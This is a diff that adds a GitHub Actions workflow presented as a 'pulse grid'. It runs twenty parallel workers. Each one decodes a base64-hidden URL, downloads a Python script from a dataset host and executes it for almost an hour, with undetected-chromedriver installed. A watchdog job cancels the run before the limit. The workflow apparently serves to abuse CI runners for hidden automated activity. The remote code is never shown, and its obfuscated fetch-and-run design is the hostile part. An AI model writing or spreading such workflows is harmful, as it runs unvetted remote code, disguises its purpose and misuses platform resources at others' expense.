@@ -1,0 +1,104 @@
+name: Obsidian Pulse Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: pulse-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  watchdog-timer:
+    name: "Watchdog Timer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_SECONDS: 3540
+    steps:
+      - name: Start Watchdog
+        run: |
+          echo "[WATCHDOG] Active for workflow run ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Waiting ${WATCHDOG_SECONDS}s before sending abort signal."
+
+          sleep "${WATCHDOG_SECONDS}"
+
+          echo "[WATCHDOG] Time window elapsed — sending cancellation request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Cancellation request sent."
+
+  grid-workers:
+    name: "Worker-${{ matrix.worker_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_code:
+          - a101
+          - b202
+          - c303
+          - d404
+          - e505
+          - f606
+          - g707
+          - h808
+          - j909
+          - k010
+          - m111
+          - n212
+          - p313
+          - q414
+          - r515
+          - s616
+          - t717
+          - u818
+          - v919
+          - w020
+
+    steps:
+      - name: Prepare Environment
+        run: |
+          echo "[SETUP] Preparing environment for ${{ matrix.worker_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      - name: Fetch Entry Script
+        run: |
+          echo "[FETCH] Retrieving entry script from source..."
+          SOURCE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SOURCE_URL" -o runner_entry.py
+          echo "[FETCH] Entry script saved."
+
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Run Entry Script With Limit
+        run: |
+          echo "[EXEC] Starting runner_entry.py on ${{ matrix.worker_code }}..."
+
+          python3 runner_entry.py &
+          ENTRY_PID=$!
+
+          echo "[EXEC] Process running (PID: ${ENTRY_PID}). Cap set to 3540s."
+
+          sleep 3540
+
+          if kill -0 "$ENTRY_PID" 2>/dev/null; then
+            echo "[EXEC] Time limit reached — stopping process ${ENTRY_PID}."
+            kill -9 "$ENTRY_PID"
+            echo "[EXEC] Process stopped."
+          else
+            echo "[EXEC] Process exited prior to time limit."
+          fi
